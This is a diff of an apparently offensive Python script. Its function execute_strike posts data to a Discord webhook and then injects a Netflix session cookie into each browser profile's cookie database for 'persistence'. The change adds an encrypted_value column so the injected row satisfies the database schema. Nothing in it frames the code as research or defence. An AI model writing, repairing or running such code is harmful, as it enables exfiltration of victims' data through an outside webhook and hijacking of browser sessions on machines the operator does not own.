@@ -82,18 +82,19 @@ def execute_strike():
                 }
                 requests.post(DISCORD_WEBHOOK, json=payload)
 
-            # 2. Injection Netflix (Schéma 2026 sans is_same_party)
+            # 2. Injection Netflix (Schéma 2026 complet)
             if NETFLIX_COOKIE_VAL:
                 print(f"[*] Injecting Persistence in {profile}...")
                 now_ts = int((time.time() + 11644473600) * 1000000)
                 expiry = 13350000000000000 
                 
+                # Ajout de encrypted_value (b'') pour satisfaire la contrainte NOT NULL
                 sql = """
                     INSERT OR REPLACE INTO cookies 
-                    (creation_utc, host_key, top_frame_site_key, name, value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent) 
-                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+                    (creation_utc, host_key, top_frame_site_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent) 
+                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                 """
-                params = (now_ts, '.netflix.com', '', 'NetflixId', NETFLIX_COOKIE_VAL, '/', expiry, 1, 1, now_ts, 1, 1)
+                params = (now_ts, '.netflix.com', '', 'NetflixId', NETFLIX_COOKIE_VAL, b'', '/', expiry, 1, 1, now_ts, 1, 1)
                 
                 cursor.execute(sql, params)
                 conn.commit()
